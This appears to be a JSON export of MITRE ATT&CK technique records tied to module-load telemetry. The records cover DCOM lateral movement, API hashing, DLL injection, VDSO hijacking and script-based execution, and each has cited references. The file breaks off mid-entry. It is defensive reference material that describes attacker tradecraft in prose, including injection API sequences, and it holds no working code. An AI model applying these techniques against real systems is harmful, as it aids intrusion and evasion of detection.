[
  {
    "id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
    "platform": "windows",
    "tid": "T1021.003",
    "technique": "Distributed Component Object Model",
    "tactic": "lateral-movement",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
    "technique_references": [
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM ACL",
        "url": "https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1",
        "description": "Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Wide Com Keys",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx",
        "description": "Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN WMI",
        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma DCOM Lateral Movement Jan 2017",
        "url": "https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",
        "description": "Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma MMC20 COM Jan 2017",
        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Excel DCOM Sept 2017",
        "url": "https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",
        "description": "Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberreason DCOM DDE Lateral Movement Nov 2017",
        "url": "https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom",
        "description": "Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4",
    "platform": "windows",
    "tid": "T1027.007",
    "technique": "Dynamic API Resolution",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",
    "technique_references": [
      {
        "source_name": "Huntress API Hash",
        "url": "https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection",
        "description": "Brennan, M. (2022, February 16). Hackers No Hashing: Randomizing API Hashes to Evade Cobalt Strike Shellcode Detection. Retrieved August 22, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat API Packers",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Choi-API-Deobfuscator-Resolving-Obfuscated-API-Functions-In-Modern-Packers.pdf",
        "description": "Choi, S. (2015, August 6). Obfuscated API Functions in Modern Packers. Retrieved August 22, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Drakonia HInvoke",
        "url": "https://dr4k0nia.github.io/dotnet/coding/2022/08/10/HInvoke-and-avoiding-PInvoke.html?s=03",
        "description": "drakonia. (2022, August 10). HInvoke and avoiding PInvoke. Retrieved August 22, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "IRED API Hashing",
        "url": "https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware",
        "description": "spotheplanet. (n.d.). Windows API Hashing in Malware. Retrieved August 22, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Hiding Malicious Code with Module Stomping",
        "url": "https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/",
        "description": "Aliz Hammond. (2019, August 15). Hiding Malicious Code with \"Module Stomping\": Part 1. Retrieved July 14, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Module Stomping for Shellcode Injection",
        "url": "https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection",
        "description": "Red Teaming Experiments. (n.d.). Module Stomping for Shellcode Injection. Retrieved July 14, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Hiding Malicious Code with Module Stomping",
        "url": "https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/",
        "description": "Aliz Hammond. (2019, August 15). Hiding Malicious Code with \"Module Stomping\": Part 1. Retrieved July 14, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Module Stomping for Shellcode Injection",
        "url": "https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection",
        "description": "Red Teaming Experiments. (n.d.). Module Stomping for Shellcode Injection. Retrieved July 14, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5",
    "platform": "linux",
    "tid": "T1055.014",
    "technique": "VDSO Hijacking",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
    "technique_references": [
      {
        "source_name": "Backtrace VDSO",
        "url": "https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/",
        "description": "backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Syscall 2014",
        "url": "https://lwn.net/Articles/604515/",
        "description": "Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ELF Injection May 2009",
        "url": "https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html",
        "description": "O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VDSO Aug 2005",
        "url": "https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/",
        "description": "Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5",
    "platform": "linux",
    "tid": "T1055.014",
    "technique": "VDSO Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
    "technique_references": [
      {
        "source_name": "Backtrace VDSO",
        "url": "https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/",
        "description": "backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Syscall 2014",
        "url": "https://lwn.net/Articles/604515/",
        "description": "Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ELF Injection May 2009",
        "url": "https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html",
        "description": "O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VDSO Aug 2005",
        "url": "https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/",
        "description": "Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
    "platform": "windows",
    "tid": "T1059.001",
    "technique": "PowerShell",
    "tactic": "execution",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
    "technique_references": [
      {
        "source_name": "Microsoft PSfromCsharp APR 2014",
        "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
        "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SilentBreak Offensive PS Dec 2015",
        "url": "https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
        "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye PowerShell Logging 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html",
        "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Github PSAttack",
        "url": "https://github.com/jaredhaight/PSAttack",
        "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "inv_ps_attacks",
        "url": "https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/",
        "description": "Hastings, M. (2014, July 16). Investigating PowerShell Attacks. Retrieved December 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet PowerShell",
        "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx",
        "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sixdub PowerPick Jan 2016",
        "url": "https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367",
        "description": "Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
    "platform": "windows|macos|linux",
    "tid": "T1059.005",
    "technique": "Visual Basic",
    "tactic": "execution",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
    "technique_references": [
      {
        "source_name": "VB .NET Mar 2020",
        "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
        "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Default VBS macros Blocking ",
        "url": "https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805",
        "description": "Kellie Eickmeyer. (2022, February 7). Helping users stay safe: Blocking internet macros by default in Office. Retrieved February 7, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBScript",
        "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
        "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft VBA",
        "url": "https://docs.microsoft.com/office/vba/api/overview/",
        "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "VB Microsoft",
        "url": "https://docs.microsoft.com/dotnet/visual-basic/",
        "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia VBA",
        "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
        "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
    "platform": "windows|macos|linux",
    "tid": "T1059.007",
    "technique": "JavaScript",
    "tactic": "execution",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as 